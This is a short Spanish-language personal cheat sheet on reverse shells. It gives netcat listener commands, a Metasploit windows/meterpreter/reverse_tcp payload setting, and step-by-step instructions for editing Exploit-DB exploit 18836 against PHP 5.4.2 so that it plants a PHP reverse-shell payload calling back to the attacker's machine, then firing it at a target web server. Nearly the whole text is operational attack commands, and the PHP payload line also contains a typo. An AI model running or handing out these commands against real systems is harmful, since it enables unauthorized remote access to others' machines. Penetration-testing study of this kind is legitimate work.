# Reverse Shells

Propietario: Adrian Gisbert Cabello

- Página para generar reverse shells: [https://www.revshells.com/](https://www.revshells.com/)

- Para ponernos en escucha a través de ***netcat*** esperando una `reverse_shell: nc -lvnp <port>` ******(en port, ponemos el número del puerto) → `nc -lvnp 1234`
    
    A una máquina windows con metasploit: `set payload windows/meterpreter/reverse_tcp <puerto>` → `set payload windows/meterpreter/reverse_tcp 8821`
    

- A través de una subida de archivo php malicioso: `searchsploit php 5.4.2` → buscamos el 18836 y lo guardamos en nuestro directorio `seatchsploit -m 18836` → abrimos el [archivo.py](http://archivo.py) y donde pone 	`pwn_code = “”"<?php phpinfo();?>"""` lo cambiamos por `pwn_code = “”"<?php $sock=fsockopen("192.168.X.X","3333"):exec("/bin/bash -i <&4 >&4 2>&4");?>"""` la ip es la de nuestra máquina atacante → nos ponemos en escucha en netcat a través del puerto 3333 `nc -lvnp 3333` → ejecutamos el archivo.py `python2 18836.py 192.168.X.X 80` ******La ip es la del equipo al cual queremos atacar y el puerto 80 del servidor http. Si no funciona con python2, probamos con python o python3